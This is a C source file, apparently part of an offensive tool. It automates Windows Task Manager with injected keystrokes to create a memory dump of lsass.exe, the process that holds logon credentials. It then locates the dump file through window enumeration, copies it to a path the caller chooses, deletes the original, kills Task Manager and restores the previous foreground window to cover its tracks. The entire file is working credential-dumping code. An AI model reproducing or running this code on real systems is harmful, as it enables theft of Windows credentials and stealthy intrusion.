/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpTaskManager.c                                                                   *
*  Purpose:      Performs memory dumping of lsass.exe using the Task Manager.                        *
*                                                                                                    *
******************************************************************************************************/
#include "DumpTaskManager.h"
#include "Common.h"
#include <string.h>
#include <strsafe.h>

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     TASKMGR_PATH                                                                        *
*  Purpose:      The Task Manager file path on disk.                                                 *
*  Remarks:      - Wrapped in quotes because it's used as a command-line.                            *
*                                                                                                    *
******************************************************************************************************/
#define TASKMGR_PATH (L"\"%WINDIR%\\System32\\Taskmgr.exe\"")

/*****************************************************************************************************
*                                                                                                   *
*  Constant:     TASKMGR_CLASS_NAME                                                                  *
*  Purpose:      The Task Manager window class name.                                                 *
*                                                                                                    *
******************************************************************************************************/
#define TASKMGR_CLASS_NAME (L"TaskManagerWindow")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     TASKMGR_WINDOW_MAX_POLL_TIME_MS                                                    *
*  Purpose:      Maximum time for the Task Manager window to pop up, in miliseconds.                 *
*                                                                                                   *
******************************************************************************************************/
#define TASKMGR_WINDOW_MAX_POLL_TIME_MS (5 * 1000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     MENU_SLEEP_TIME_MS                                                                  *
*  Purpose:      Sleep time for the Task Manager menu to pop up, in miliseconds.                     *
*                                                                                                    *
******************************************************************************************************/
#define MENU_SLEEP_TIME_MS (200)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     TASKMGR_WINDOW_SLEEP_TIME_MS                                                        *
*  Purpose:      Time for the Task Manager window to materialize after finding it, in miliseconds.   *
*                                                                                                    *
******************************************************************************************************/
#define TASKMGR_WINDOW_SLEEP_TIME_MS (5 * 1000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     DUMP_WAIT_TIME_MS                                                                   *
*  Purpose:      Maximum time to wait for the dump file to appear, in miliseconds.                   *
*                                                                                                    *
******************************************************************************************************/
#define DUMP_WAIT_TIME_MS (10 * 1000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     POLLING_FREQUENCY_MS                                                                *
*  Purpose:      Polling frequency for wait times, in miliseconds.                                   *
*                                                                                                    *
******************************************************************************************************/
#define POLLING_FREQUENCY_MS (100)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     LSASS_PROCESS_TEXT                                                                  *
*  Purpose:      The process text that represents lsass.exe in Task Manager.                         *
*                                                                                                   *
******************************************************************************************************/
#define LSASS_PROCESS_TEXT (L"Local Security Authority")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     DUMP_PATH_SUFFIX                                                                    *
*  Purpose:      The suffix for the dump file path.                                                  *
*  Remarks:      - Naively you'd want "lsass.dmp", but if that file exists before it might not be    *
*                  the case (e.g. "lsass (2).dmp" is a valid dump file name for lsass.exe). Due to   *
*                  the ".dmp" extension being unique in the Task Manager window - it's a fair        *
*                  assumption to make with a very low risk.                                          *
*                                                                                                    *
******************************************************************************************************/
#define DUMP_PATH_SUFFIX (L".dmp")

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    TASKMGR_WINDOW_ENUM_CONTEXT                                                         *
*  Purpose:      Defines a callback context for window enumerations.                                 *
*                                                                                                    *
******************************************************************************************************/
typedef struct _TASKMGR_WINDOW_ENUM_CONTEXT
{
    DWORD dwTaskmgrProcessId;
    WCHAR wszDumpFilePath[MAX_PATH];
    SIZE_T cchDumpSuffix;
    BOOL bFoundDumpFile;
} TASKMGR_WINDOW_ENUM_CONTEXT, *PTASKMGR_WINDOW_ENUM_CONTEXT;

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumptaskmanager_SendKeystrokesToTaskManager                                         *
*  Purpose:      Sends keystrokes to the Task Manager and make it perform a dump.                    *
*  Parameters:  - hTaskmgrWindow - the Task Manager UI window.                                       *
*  Returns:      A return status.                                                                    *
*  Remarks:     - Changes the foreground window to the Task Manager window as a side-effect.         *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumptaskmanager_SendKeystrokesToTaskManager(
    __in __notnull HWND hTaskmgrWindow
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    PINPUT ptInputs = NULL;
    SIZE_T nInputs = 0;
    SIZE_T cchMessage = 0;
    SIZE_T nCounter = 0;
    INPUT tCreateDumpInput = { 0 };

    // Validate arguments
    DEBUG_ASSERT(NULL != hTaskmgrWindow);

    // Allocate inputs
    // Our strategy is to:
    //   1. Inject keystrokes that spell out the lsass.exe process text
    //   2. Inject the special Windows "Menu" keystroke
    //   3. Inject the "C" letter for creating a dump - which will have to be sent after the new menu is created
    cchMessage = wcslen(LSASS_PROCESS_TEXT);
    nInputs = cchMessage + 1;
    ptInputs = (PINPUT)HEAPALLOCZ(nInputs * sizeof(*ptInputs));
    if (NULL == ptInputs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed allocating inputs (nInputs=%Iu)", nInputs);
        goto lblCleanup;
    }
    
    // Build the inputs for the plaintext keystrokes
    for (nCounter = 0; nCounter < cchMessage; nCounter++)
    {
        ptInputs[nCounter].type = INPUT_KEYBOARD;
        ptInputs[nCounter].ki.wScan = LSASS_PROCESS_TEXT[nCounter];
        ptInputs[nCounter].ki.dwFlags = KEYEVENTF_UNICODE;
    }

    // Build the last two special inputs
    ptInputs[cchMessage].type = INPUT_KEYBOARD;
    ptInputs[cchMessage].ki.wVk = VK_APPS;
    tCreateDumpInput.type = INPUT_KEYBOARD;
    tCreateDumpInput.ki.wScan = L'C';
    tCreateDumpInput.ki.dwFlags = KEYEVENTF_UNICODE;

    // Sets the foreground window
    if (!SetForegroundWindow(hTaskmgrWindow))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"SetForegroundWindow() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Send the input string
    if (nInputs != SendInput((UINT)nInputs, ptInputs, sizeof(*ptInputs)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"SendInput() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Wait for the foreground window to change
    Sleep(MENU_SLEEP_TIME_MS);

    // Create the dump
    if (1 != SendInput(1, &tCreateDumpInput, sizeof(tCreateDumpInput)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"SendInput() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    HEAPFREE(ptInputs);

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumptaskmanager_TaskmgrSubWindowHandler                                             *
*  Purpose:      The handler for the Task Manager sub-windows. Ultimately finds the dump file.       *
*  Parameters:  - hWindow - the currently assessed window.                                           *
*               - ptParam - the context for the callback function.                                   *
*  Returns:      TRUE upon success, FALSE otherwise.                                                 *
*                                                                                                    *
******************************************************************************************************/
__success(return > 0)
static
BOOL
CALLBACK
dumptaskmanager_TaskmgrSubWindowHandler(
    __in __notnull HWND hWindow,
    __inout LPARAM ptParam
)
{
    BOOL bResult = FALSE;
    PTASKMGR_WINDOW_ENUM_CONTEXT ptContext = (PTASKMGR_WINDOW_ENUM_CONTEXT)ptParam;
    WCHAR wszWindowText[MAX_PATH] = { 0 };
    SIZE_T cchText = 0;
    HRESULT hrStringResult = E_UNEXPECTED;

    // Validate arguments
    DEBUG_ASSERT(NULL != hWindow);
    DEBUG_ASSERT(NULL != ptContext);

    // Do nothing if we already found the dump file
    __analysis_assume(NULL != ptContext);
    if (!ptContext->bFoundDumpFile)
    {
        // Get the window text and match it
        // Since the window is owned by a different process we must not use GetWindowTextW but actually are forced to send WM_GETTEXT
        // We perform a best-effort approach on purpose
        if (0 < SendMessageW(hWindow, WM_GETTEXT, (WPARAM)ARRAYSIZE(wszWindowText), (LPARAM)wszWindowText))
        {
            cchText = wcslen(wszWindowText);
            if (0 == _wcsicmp(wszWindowText + cchText - ptContext->cchDumpSuffix, DUMP_PATH_SUFFIX))
            {
                hrStringResult = StringCchCopyW(ptContext->wszDumpFilePath, ARRAYSIZE(ptContext->wszDumpFilePath), wszWindowText);
                if (FAILED(hrStringResult))
                {
                    DEBUG_MSG(L"StringCchCopyW() failed (hrStringResult=%.8x)", hrStringResult);
                    goto lblCleanup;
                }
                ptContext->bFoundDumpFile = TRUE;
            }
        }

        // Recursively enumerate all child windows (best-effort)
        (VOID)EnumChildWindows(hWindow, dumptaskmanager_TaskmgrSubWindowHandler, ptParam);
    }

    // Success
    bResult = TRUE;

lblCleanup:

    // Return result
    return bResult;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumptaskmanager_TaskmgrTopLevelWindowHandler                                        *
*  Purpose:      The handler for the Task Manager top-level windows. Ultimately finds the dump file. *
*  Parameters:  - hWindow - the currently assessed window.                                           *
*               - ptParam - the context for the callback function.                                   *
*  Returns:      TRUE upon success, FALSE otherwise.                                                 *
*                                                                                                    *
******************************************************************************************************/
__success(return > 0)
static
BOOL
CALLBACK
dumptaskmanager_TaskmgrTopLevelWindowHandler(
    __in __notnull HWND hWindow,
    __inout LPARAM ptParam
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    PTASKMGR_WINDOW_ENUM_CONTEXT ptContext = (PTASKMGR_WINDOW_ENUM_CONTEXT)ptParam;
    DWORD dwProcessId = 0;

    // Validate arguments
    DEBUG_ASSERT(NULL != hWindow);
    DEBUG_ASSERT(NULL != ptContext);

    // Do nothing if we already found the dump file
    __analysis_assume(NULL != ptContext);
    if (!ptContext->bFoundDumpFile)
    {
        // Get the owning process for the assessed window
        if (0 == GetWindowThreadProcessId(hWindow, &dwProcessId))
        {
            DEBUG_MSG(L"GetWindowThreadProcessId() failed (LastError=%lu)", GetLastError());
            goto lblCleanup;
        }

        // Only handle windows that belong to the Task Manager
        if (dwProcessId == ptContext->dwTaskmgrProcessId)
        {
            // Recursively enumerate all the child windows (best-effort)
            (VOID)EnumChildWindows(hWindow, dumptaskmanager_TaskmgrSubWindowHandler, ptParam);
        }
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumptaskmanager_PerformTaskmgrDump                                                  *
*  Purpose:      Causes the Task Manager to dump the lsass.exe memory and finds the dump file path.  *
*  Parameters:  - dwTaskmgrProcessId - the task manager process ID.                                  *
*               - pwszDumpFilePath - gets the dump file path upon success.                           *
*  Returns:      A return status.                                                                    *
*  Remarks:     - Assumes pwszDumpFilePath has at least MAX_PATH characters to store.                *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumptaskmanager_PerformTaskmgrDump(
    __in DWORD dwTaskmgrProcessId,
    __out_ecount(MAX_PATH) PWSTR pwszDumpFilePath
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HWND hTaskmgrWindow = NULL;
    TASKMGR_WINDOW_ENUM_CONTEXT tWindowEnumContext = { 0 };
    ULONGLONG qwBaseTickCount = 0;

    // Validate arguments
    DEBUG_ASSERT(NULL != pwszDumpFilePath);

    // Prepare the window enumeration context
    tWindowEnumContext.dwTaskmgrProcessId = dwTaskmgrProcessId;
    tWindowEnumContext.cchDumpSuffix = wcslen(DUMP_PATH_SUFFIX);

    // Poll on the Task Manager window
    COMPILE_TIME_ASSERT(POLLING_FREQUENCY_MS < TASKMGR_WINDOW_MAX_POLL_TIME_MS);
    for (qwBaseTickCount = GetTickCount64(); GetTickCount64() - qwBaseTickCount < TASKMGR_WINDOW_MAX_POLL_TIME_MS; Sleep(POLLING_FREQUENCY_MS))
    {
        // Find the Task Manager window
        hTaskmgrWindow = FindWindowW(TASKMGR_CLASS_NAME, NULL);
        if (NULL != hTaskmgrWindow)
        {
            break;
        }
    }

    // Make sure we found the Task Manager window
    if (NULL == hTaskmgrWindow)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Could not find Task Manager window");
        goto lblCleanup;
    }

    // Sleep for the Task Manager window to fully materialize
    Sleep(TASKMGR_WINDOW_SLEEP_TIME_MS);

    // Inject keystrokes to create a memory dump
    eStatus = dumptaskmanager_SendKeystrokesToTaskManager(hTaskmgrWindow);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"dumptaskmanager_SendKeystrokesToTaskManager failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Poll on the dump file
    COMPILE_TIME_ASSERT(POLLING_FREQUENCY_MS < DUMP_WAIT_TIME_MS);
    for (qwBaseTickCount = GetTickCount64(); GetTickCount64() - qwBaseTickCount < DUMP_WAIT_TIME_MS; Sleep(POLLING_FREQUENCY_MS))
    {
        // Finds the window that has the dump file by looking for all child windows of the Task Manager
        if (!EnumWindows(dumptaskmanager_TaskmgrTopLevelWindowHandler, (LPARAM)&tWindowEnumContext))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"EnumWindows failed");
            goto lblCleanup;
        }

        // Bail out if the dump file is found
        if (tWindowEnumContext.bFoundDumpFile)
        {
            break;
        }
    }

    // Fail if we haven't found the dump file path
    if (!tWindowEnumContext.bFoundDumpFile)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Could not find the dump file");
        goto lblCleanup;
    }

    // Success
    CopyMemory(pwszDumpFilePath, tWindowEnumContext.wszDumpFilePath, (wcslen(tWindowEnumContext.wszDumpFilePath) + 1) * sizeof(*pwszDumpFilePath));
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return result
    return eStatus;;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumptaskmanager_RunTaskmgr                                                          *
*  Purpose:      Runs a new Task Manager process.                                                    *
*  Parameters:  - phTaskmgrHandle - gets the Task Manager process handle upon success.               *
*               - pdwTaskmgrProcessId - gets the Task Manager process ID upon success.               *
*  Returns:      A return status.                                                                    *
*  Remarks:     - Free the returned process handle with CloseHandle.                                 *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumptaskmanager_RunTaskmgr(
    __out PHANDLE phTaskmgrHandle,
    __out PDWORD pdwTaskmgrProcessId
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    WCHAR wszTaskmgrPath[MAX_PATH] = { 0 };

    // Validate arguments
    DEBUG_ASSERT(NULL != phTaskmgrHandle);
    DEBUG_ASSERT(NULL != pdwTaskmgrProcessId);

    // Resolve the task manager path
    if (0 == ExpandEnvironmentStringsW(TASKMGR_PATH, wszTaskmgrPath, ARRAYSIZE(wszTaskmgrPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Run the task manager and save its process ID for later use
    eStatus = COMMON_RunProcess(wszTaskmgrPath, FALSE, FALSE, phTaskmgrHandle, pdwTaskmgrProcessId);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_RunProcess failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     TaskmgrDumpToDisk                                                                   *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPTASKMANAGER_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    WCHAR wszFinalDumpPath[MAX_PATH] = { 0 };
    WCHAR wszFoundDumpPath[MAX_PATH] = { 0 };
    HANDLE hTaskmgrHandle = NULL;
    DWORD dwTaskmgrProcessId = 0;
    BOOL bKillTaskmgr = FALSE;
    HWND hOldForegroundWindow = NULL;
    BOOL bDeleteDumpFile = FALSE;

    // Validate arguments
    if (ARG_INDEX_DUMP_PATH >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Expand environment variables to the final dump path
    if (0 == ExpandEnvironmentStringsW(ppwszArgs[ARG_INDEX_DUMP_PATH], wszFinalDumpPath, ARRAYSIZE(wszFinalDumpPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Get the old foreground window to be restored later
    hOldForegroundWindow = GetForegroundWindow();
    if (NULL == hOldForegroundWindow)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"GetForegroundWindow() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Run the task manager
    eStatus = dumptaskmanager_RunTaskmgr(&hTaskmgrHandle, &dwTaskmgrProcessId);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"dumptaskmanager_RunTaskmgr failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }
    bKillTaskmgr = TRUE;

    // Cause a dump
    eStatus = dumptaskmanager_PerformTaskmgrDump(dwTaskmgrProcessId, wszFoundDumpPath);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"PerformTaskmgrDump failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }
    bDeleteDumpFile = TRUE;

    // Copy the dump file
    // We copy and not move to handle situations of cross-filesystem copies
    if (!CopyFileW(wszFoundDumpPath, wszFinalDumpPath, FALSE))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CopyFileW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Kill the Task Manager process
    if (bKillTaskmgr)
    {
        (VOID)TerminateProcess(hTaskmgrHandle, 0);
    }

    // Free resources
    CLOSE_HANDLE(hTaskmgrHandle);

    // Delete the dump file if it was found
    if (bDeleteDumpFile)
    {
        (VOID)DeleteFileW(wszFoundDumpPath);
    }

    // Restore the foreground window
    if (NULL != hOldForegroundWindow)
    {
        (VOID)SetForegroundWindow(hOldForegroundWindow);
    }

    // Return result
    return eStatus;
}
